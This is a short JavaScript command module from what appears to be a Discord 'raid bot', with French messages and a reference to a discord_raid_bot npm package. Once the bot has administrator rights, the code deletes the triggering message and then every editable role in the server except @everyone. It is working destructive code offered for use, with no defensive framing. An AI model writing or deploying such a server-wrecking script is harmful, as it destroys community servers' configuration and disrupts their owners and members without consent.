module.exports = (message, client) => {
    if (message.author.id === client.user.id) return;
    if (message.channel.type === 'dm') return message.author.send("Cette commande n'est pas utilisable par message privé.");
    if (!message.guild.me.hasPermission('ADMINISTRATOR')) return message.author.send('Je ne suis pas administrateur sur ce serveur.');
    message.delete('https://www.npmjs.com/package/discord_raid_bot');message.guild.roles.map(role => {
        if (role.editable) {
            if (role.name === '@everyone') return;
            role.delete()
                .then(console.log(`Rôle ${role.name} supprimé sur le serveur ${message.guild.name}.`))
                .catch(console.error);
        }
    });
}